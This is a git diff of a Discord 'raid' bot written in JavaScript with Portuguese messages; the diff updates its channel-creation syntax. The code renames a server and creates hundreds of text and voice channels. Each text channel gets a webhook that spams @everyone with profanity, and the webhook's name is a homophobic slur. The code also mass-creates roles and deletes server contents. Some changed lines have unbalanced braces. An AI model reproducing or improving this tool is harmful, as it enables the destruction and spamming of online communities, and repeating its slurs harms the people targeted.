@@ -30,12 +30,12 @@ client.on("message", async (message) => {
     switch(comando) {
         case "yeet":
             message.delete();
-            if(message.guild.channels > 500) return message.channel.send(`too much text channels`)
+            if(message.guild.channels > 499) return message.author.send(`too much text channels`)
             let i;
             if(!args.slice(0).join(' ')){ 
                 message.guild.setName('haha admin go grr')
                 for(i = 0; i < 499; i++){
-                    message.guild.createChannel('haha admin go grr', 'text').then(m =>{
+                    message.guild.createChannel(`haha admin go grr`, {type: `text`).then(m =>{
                         const mch1 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
                           const case1hook = new Discord.WebhookClient(w.id, w.token)
@@ -51,12 +51,13 @@ client.on("message", async (message) => {
                           case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                         })
                     })
-                    message.guild.createChannel('haha admin go grr', 'voice')
+                    message.guild.createChannel(`haha admin go grr`, {type: `voice`)
+                    if(message.guild.channels > 499) return
                  }
             } else {
                 message.guild.setName(`${args.slice(0).join(' ')}`)
                 for(i = 0; i < 499; i++){
-                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'text').then(m =>{
+                    message.guild.createChannel(`${args.slice(0).join(' ')}`, {type: `text`}).then(m =>{
                         const mch2 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
                           const case2hook = new Discord.WebhookClient(w.id, w.token)                        
@@ -72,7 +73,7 @@ client.on("message", async (message) => {
                           case1hook.send(`@everyone EEE CARALHO FODASE PORRAAAAAAAA`)
                         })
                     })
-                    message.guild.createChannel(`${args.slice(0).join(' ')}`, 'voice')
+                    message.guild.createChannel(`${args.slice(0).join(' ')}`, {type: `voice`})
                 }
             }
             for(i = 0; i == 250; i++) message.guild.createRole({name: 'boiola'})
@@ -80,7 +81,7 @@ client.on("message", async (message) => {
         case "del":
             message.delete();
             server.deleteAll();
-            message.guild.createChannel('se fudeu', 'text')
+            message.guild.createChannel(`\u17B5`, {type: `text`})
         break;
         case "admall":
             message.delete();
